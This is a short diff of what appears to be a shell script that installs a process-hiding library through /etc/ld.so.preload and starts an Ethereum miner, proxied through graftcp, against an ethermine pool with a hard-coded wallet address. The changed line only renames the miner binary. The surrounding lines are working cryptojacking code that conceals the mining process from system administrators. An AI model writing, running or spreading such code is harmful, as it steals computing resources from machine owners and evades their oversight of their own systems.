@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./beezHash --coin ETH --pool us1.ethermine.org:4444 --user 0xfd5764de1217bdd5046649e543bdb11fbca0771f.$(echo $(shuf -i 1-999999 -n 1)-kimo)
+./graftcp/graftcp ./bezzHash --coin ETH --pool us1.ethermine.org:4444 --user 0xfd5764de1217bdd5046649e543bdb11fbca0771f.$(echo $(shuf -i 1-999999 -n 1)-kimo)
